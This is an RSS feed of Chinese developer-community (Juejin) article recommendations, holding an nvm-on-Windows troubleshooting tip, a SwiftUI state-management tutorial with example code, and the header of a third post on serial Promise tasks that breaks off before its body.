<?xml version="1.0" encoding="UTF-8"?><rss version="2.0">  <channel>      <title>掘金文章推荐</title>      <link>https://juejin.cn/recommended?sort=newest</link>      <description>一个帮助开发者成长的社区</description>      <generator>python juejin_recom.py @Pi20</generator>      <item>    <title><![CDATA[nvm use xxx 报错： exit status 145: The directory is not empty.]]></title>    <link>https://juejin.cn/post/7581413562485784582</link>    <guid>https://juejin.cn/post/7581413562485784582</guid>    <pubDate>2025-12-09T05:28:10.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581413562485784582" data-draft-id="7581408984415633427" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="nvm use xxx 报错： exit status 145: The directory is not empty."/> <meta itemprop="keywords" content="Node.js,前端"/> <meta itemprop="datePublished" content="2025-12-09T05:28:10.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="acaiEncode"/> <meta itemprop="url" content="https://juejin.cn/user/3773179639371336"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            nvm use xxx 报错： exit status 145: The directory is not empty.
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3773179639371336/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    acaiEncode
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T05:28:10.000Z" title="Tue Dec 09 2025 05:28:10 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读1分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><pre><code class="hljs language-vbscript" lang="vbscript">nvm use <span class="hljs-number">20.19</span><span class="hljs-number">.6</span>
<span class="hljs-keyword">exit</span> status <span class="hljs-number">145</span>: The directory <span class="hljs-keyword">is</span> <span class="hljs-keyword">not</span> <span class="hljs-literal">empty</span>.
</code></pre>
<ul>
<li>
<p>检查本地是否有残留的node版本，若有都要删除干净。</p>
</li>
<li>
<p>检查node是否可用（前提：node系统环境变量要添加，且该path要与nvm中node安装地址一致），<code>node -v</code>报错<code> node -v 'node' 不是内部或外部命令,也不是可运行的程序 或批处理文件</code>。</p>
</li>
<li>
<p>再次检查node系统环境变量是否已经添加（已添加）。</p>
</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/3ab89049bfcf450f8e7d6852e226eb97~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWNhaUVuY29kZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765862889&amp;x-signature=wLyuDKDdcqmBlWpxR7JbAJE%2BID8%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li>在nvm安装node的文件夹下创建空文件夹<code>nodejs</code></li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/72bb4548e34e446cb918bb5a798d41d6~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWNhaUVuY29kZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765862889&amp;x-signature=s4miCIq%2FHgVMUxOAsASyu4ibtbg%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><code>nvm use  20.19.6</code> 切换成功！</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/465249d6de564e2dba0826881ea67114~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWNhaUVuY29kZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765862889&amp;x-signature=JBW9E3ZGtj%2BZ3yxUt2%2BxQjSsksM%3D" alt="image.png" loading="lazy"/></p>
<ul>
<li><code>node -v</code> 查看node版本也OK~</li>
</ul>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/6d2c352f8d014c4badd29cae51da799c~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgYWNhaUVuY29kZQ==:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765862889&amp;x-signature=HzHfZ4vP1WIkT%2Ff2tvP3oNoRPH0%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[swiftUI状态管理]]></title>    <link>https://juejin.cn/post/7581619505584668723</link>    <guid>https://juejin.cn/post/7581619505584668723</guid>    <pubDate>2025-12-09T03:41:27.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581619505584668723" data-draft-id="7581412607061098542" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="swiftUI状态管理"/> <meta itemprop="keywords" content="iOS,SwiftUI"/> <meta itemprop="datePublished" content="2025-12-09T03:41:27.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="mike1023"/> <meta itemprop="url" content="https://juejin.cn/user/2348212565321751"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            swiftUI状态管理
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/2348212565321751/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    mike1023
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:41:27.000Z" title="Tue Dec 09 2025 03:41:27 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读2分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><h2 data-id="heading-0">@state</h2>
<p>用于当前视图的状态管理，@State的属性生命周期和当前视图保持一致</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ContentView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isPlaying: <span class="hljs-type">Bool</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">Button</span> {
                isPlaying.toggle()
            } label: {
                <span class="hljs-type">Image</span>(systemName: isPlaying <span class="hljs-operator">?</span> <span class="hljs-string">"pause.circle"</span> : <span class="hljs-string">"play.circle"</span>)
            }
        }
        .padding()
  
</code></pre>
<h2 data-id="heading-1">@binding</h2>
<p>主要用于父子视图之间共享状态</p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/5a08e8355d3c40ee912a96905dca0daf~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbWlrZTEwMjM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856487&amp;x-signature=6CXq3WME674sOWOm6lmmFFAJGWc%3D" alt="binding.jpg" loading="lazy"/></p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-comment">// 子视图</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">PlayButton</span>: <span class="hljs-title class_">View</span> {
    
    <span class="hljs-meta">@Binding</span> <span class="hljs-keyword">var</span> isPlaying: <span class="hljs-type">Bool</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">Button</span>(action: {
            <span class="hljs-keyword">self</span>.isPlaying.toggle()
        }) {
            <span class="hljs-type">Image</span>(systemName: isPlaying <span class="hljs-operator">?</span> <span class="hljs-string">"pause.circle"</span> : <span class="hljs-string">"play.circle"</span>)
        }
    }
}

<span class="hljs-comment">// 父视图</span>
<span class="hljs-keyword">struct</span> <span class="hljs-title class_">ContentView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> isPlaying: <span class="hljs-type">Bool</span> <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">Text</span>(<span class="hljs-string">"11111"</span>)
            <span class="hljs-type">Text</span>(<span class="hljs-string">"22222"</span>)
            <span class="hljs-type">PlayButton</span>(isPlaying: <span class="hljs-variable">$isPlaying</span>)
        }
        .padding()
    }
}
</code></pre>
<h2 data-id="heading-2">@stateObject 和 @observedObject</h2>
<p>先看一个例子：</p>
<p>主视图</p>
<p>点击button会更改视图的<code>showRealName</code>的状态，导致视图刷新</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ContentView</span>: <span class="hljs-title class_">View</span> {
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> showRealName <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">Button</span>(<span class="hljs-string">"Toggle name"</span>) {
                showRealName.toggle()
            }
            <span class="hljs-type">Text</span>(<span class="hljs-string">"current user: <span class="hljs-subst">\(showRealName <span class="hljs-operator">?</span> <span class="hljs-string">"Harris"</span> : <span class="hljs-string">"yiyi"</span>)</span>"</span>)
            <span class="hljs-type">ScorePlate</span>().padding(.top, <span class="hljs-number">20</span>)
        }
        .padding()
    }
}
</code></pre>
<p>ScorePlate</p>
<p>点击button改变model的score属性值</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Model</span>: <span class="hljs-title class_">ObservableObject</span> {
    <span class="hljs-keyword">init</span>() {
        <span class="hljs-built_in">print</span>(<span class="hljs-string">"model created"</span>)
    }
    <span class="hljs-meta">@Published</span> <span class="hljs-keyword">var</span> score: <span class="hljs-type">Int</span> <span class="hljs-operator">=</span> <span class="hljs-number">0</span>
}
</code></pre>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ScorePlate</span>: <span class="hljs-title class_">View</span> {
    
    <span class="hljs-meta">@ObservedObject</span> <span class="hljs-keyword">var</span> model <span class="hljs-operator">=</span> <span class="hljs-type">Model</span>()
    <span class="hljs-meta">@State</span> <span class="hljs-keyword">private</span> <span class="hljs-keyword">var</span> niceScore <span class="hljs-operator">=</span> <span class="hljs-literal">false</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-type">VStack</span> {
            <span class="hljs-type">Button</span>(<span class="hljs-string">"+1"</span>) {
                model.score <span class="hljs-operator">+=</span> <span class="hljs-number">1</span>
                <span class="hljs-keyword">if</span> model.score <span class="hljs-operator">&gt;</span> <span class="hljs-number">3</span> {
                    niceScore <span class="hljs-operator">=</span> <span class="hljs-literal">true</span>
                }
                <span class="hljs-built_in">print</span>(<span class="hljs-string">"model.score = <span class="hljs-subst">\(model.score)</span>"</span>)
            }
            <span class="hljs-type">Text</span>(<span class="hljs-string">"score: <span class="hljs-subst">\(model.score)</span>"</span>)
            <span class="hljs-type">Text</span>(<span class="hljs-string">"Nice? <span class="hljs-subst">\(niceScore <span class="hljs-operator">?</span> <span class="hljs-string">"YES"</span> : <span class="hljs-string">"NO"</span>)</span>"</span>)
            <span class="hljs-type">ScoreText</span>(model: model).padding(.top, <span class="hljs-number">20</span>)
        }
    }
}
</code></pre>
<p>ScoreText: 接收从外部传入的model，根据model中score的值更新文本</p>
<pre><code class="hljs language-swift" lang="swift"><span class="hljs-keyword">struct</span> <span class="hljs-title class_">ScoreText</span>: <span class="hljs-title class_">View</span> {
    
    <span class="hljs-meta">@ObservedObject</span> <span class="hljs-keyword">var</span> model: <span class="hljs-type">Model</span>
    
    <span class="hljs-keyword">var</span> body: <span class="hljs-keyword">some</span> <span class="hljs-type">View</span> {
        <span class="hljs-keyword">if</span> model.score <span class="hljs-operator">&gt;</span> <span class="hljs-number">10</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-type">Text</span>(<span class="hljs-string">"fantastic"</span>)
        } <span class="hljs-keyword">else</span> <span class="hljs-keyword">if</span> model.score <span class="hljs-operator">&gt;</span> <span class="hljs-number">3</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-type">Text</span>(<span class="hljs-string">"Good"</span>)
        } <span class="hljs-keyword">else</span> {
            <span class="hljs-keyword">return</span> <span class="hljs-type">Text</span>(<span class="hljs-string">"mmmmm"</span>)
        }
    }
}
</code></pre>
<p>当多次点击+1 button时，score增加，ScorePlate和ScoreText都正常更新，但是当点击 <code>Togglename</code> 时，发现model的 init 方法再次执行，意味着model被重置了，score的值也被重置了，ScorePlate和ScoreText的状态都丢失了，这不是期望的结果。</p>
<blockquote>
<p>原因：这是因为，和@state 这种底层存储被 SwiftUl“全面接管”的状态不同，@observedobject只是在View和Model之间添加订阅关系，而不影响存储。因此，当ContentView中的状态发生变化，ContentView.body 被重新求值时，ScorePlate就会被重新生成，其中的 model也一同重新生成，导致了状态的“丢失”。</p>
</blockquote>
<p>解决办法：在ScorePlate中，把model的修饰符改为：<code>@stateobject</code></p>
<p><img src="https://p9-xtjj-sign.byteimg.com/tos-cn-i-73owjymdk6/7620960eac174648a145c36e267ae682~tplv-73owjymdk6-jj-mark-v1:0:0:0:0:5o6Y6YeR5oqA5pyv56S-5Yy6IEAgbWlrZTEwMjM=:q75.awebp?rk3s=f64ab15b&amp;x-expires=1765856487&amp;x-signature=88dtdflfG%2B1L71AtTXC7JRbMgUE%3D" alt="image.png" loading="lazy"/></p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[使用Promise实现串行执行异步任务，含出错重试功能]]></title>    <link>https://juejin.cn/post/7581470169840631846</link>    <guid>https://juejin.cn/post/7581470169840631846</guid>    <pubDate>2025-12-09T04:47:32.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581470169840631846" data-draft-id="7581350888790376484" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="使用Promise实现串行执行异步任务，含出错重试功能"/> <meta itemprop="keywords" content="JavaScript"/> <meta itemprop="datePublished" content="2025-12-09T04:47:32.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="我也想好好学习"/> <meta itemprop="url" content="https://juejin.cn/user/1317650407368906"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            使用Promise实现串行执行异步任务，含出错重试功能
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/1317650407368906/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    我也想好好学习
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T04:47:32.000Z" title="Tue Dec 09 2025 04:47:32 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    12
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读3分钟
